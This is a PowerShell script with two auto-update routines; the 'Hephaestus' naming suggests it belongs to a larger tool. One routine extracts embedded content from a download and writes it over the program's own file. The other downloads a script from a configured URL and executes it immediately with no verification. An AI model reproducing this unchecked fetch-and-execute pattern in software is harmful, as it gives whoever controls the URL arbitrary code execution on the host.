. ./utils.ps1
. ./consts.ps1


function DoUpdate() {
    if (-not $server.autoUpdate){
        return
    }
    $timeout = [datetime]::UtcNow.AddMinutes(5)
    $delay = 5
    Start-Sleep -Seconds $delay

    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $server.updateUrl -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                
                $file=Get-HephaestusPath
                ExtractEmbedding -inContent $response.Content -outFile $file
                return
            }
        }
        catch {
            writedbg "Failed to download autoUpdate: $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the autoUpdate within the allotted time."
}

function DoExtraUpdate() {
    if (-not $server.extraUpdate){
        return
    }
    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 5
    Start-Sleep -Seconds $delay
    
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                $scriptBlock = [ScriptBlock]::Create($response.Content)
                . $scriptBlock
                return
            }
        }
        catch {
            writedbg "Failed to download or execute the script: $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the script within the allotted time."
}